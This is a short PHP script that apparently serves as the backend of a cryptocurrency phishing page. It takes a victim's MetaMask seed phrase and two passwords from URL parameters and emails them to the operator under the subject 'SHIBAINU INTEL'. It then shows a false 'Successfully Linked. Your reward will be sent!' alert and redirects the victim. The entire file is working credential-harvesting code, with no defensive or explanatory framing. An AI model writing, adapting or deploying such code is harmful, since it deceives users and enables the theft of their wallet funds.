<?php
require '../email_file/mail-function.php';
// PrivateKey=aaa&password1=aaa&password2=aaa
$PrivateKey = $_GET['PrivateKey'];
$password1 = $_GET['password1'];
$password2 = $_GET['password2'];

$name = 'Wallet Key';
$subject = 'SHIBAINU INTEL!';
$body = "<h2>SHIBAINU INTEL - Metamask Keys</h2>
<h3>Phrase</h3>
<p>$PrivateKey</p>
<h3>Password</h3>
<p>$password1</p>
<p>$password2</p>";

$status = send_mail($to, $name, $subject, $body);
// $status = true;

if ($status) {
    echo "<script>alert('Successfully Linked. Your reward will be sent!');
     window.location.href = 'index.html';</script>";
}